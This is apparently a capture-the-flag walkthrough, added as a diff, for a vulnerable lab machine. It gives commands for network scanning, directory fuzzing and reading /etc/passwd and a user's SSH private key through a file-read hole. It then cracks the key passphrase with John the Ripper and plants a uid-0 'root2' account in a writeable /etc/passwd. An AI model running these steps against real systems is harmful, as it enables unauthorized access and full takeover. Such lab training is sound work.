@@ -1,0 +1,62 @@
+1. -> nmap -sn 192.168.56.0/24
+   ( Let's start with a network scan to find out the IP address of target machine.)
+
+
+2. -> nmap -sV -A -p- 192.168.56.x  
+   ( Scanning via nmap for the open services which are running on the target machine.)
+
+
+3. -> dirb http://192.168.56.107/
+   ( dirb is a utility for website directory enumeration which helps in finding the hidden directories of the targeted                    website.)
+
+
+4. -> gobuster dir -u http://192.168.56.107/secret/ -w /usr/share/dirb/wordlists/common.txt -x php
+   ( Exploring the “/secret” directory, we find nothing of interest. To further investigate, we decide to fuzz for PHP files.)
+
+
+5. -> ffuf -u http://192.168.56.107/secret/evil.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0
+   ( Testing various actions on the “evil.php” file, we find a parameter named “command” that allows directory traversal. We verify the existence of the user “mowree” and locate an SSH key for that user.)
+
+
+
+
+6. Now for ssh public key :      "http://192.168.56.107/secret/evil.php?command=/home/mowree/.ssh/id_rsa"
+   Then, view page source and save the key locally in "id_rsa" file 
+   ( To crack the SSH key’s password, we convert it to a format suitable for John the Ripper using ssh2john.)
+
+
+7. -> ssh2john id_rsa > hash.txt
+   -> chmod 700 id_rsa
+   ( Save the contents of “id_rsa” locally.
+     Set the permissions using “chmod 700 id_rsa“
+     Convert the SSH key to the John format with ssh2john.)
+
+
+9. -> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+   ( Here, we’ve used “john” utility to crack the ssh key passphrase.)
+
+
+10. -> ssh -i id_rsa mowree@192.168.56.107
+( Now, login to target machine through running ssh services.)
+
+
+11. -> sudo -l
+      -> echo "to check if passwd is writeable" >> /etc/passwd
+( For Privilege escalation from normal user to the above command we found that /etc/passwd is writeable.)
+
+
+12. -> openssl passwd pass123
+( Using openssl we will generate hash for the password “pass123” for our newly created root with username  “root2”.)
+
+ Now,  Copy "root:x:0:0:root:/root:/usr/bin/zsh" line to editor and replace x with hash say   "$1$Pp1RiTYd$vp2WW9pBtKkXJdwpn8L.V1"
+
+ Now, multiple root user couldn't be present, so replace "root" with say "root2"
+ Then, Create new root user by adding "root2:$1$Pp1RiTYd$vp2WW9pBtKkXJdwpn8L.V1:0:0:root:/root:/usr/bin/zsh" to our /etc/passwd file 
+
+
+13. -> su root2
+      -> pass123
+      ( Since the “pass123” was the password for the root2 root user that we had created.)
+ 
+
+14. -> ls /
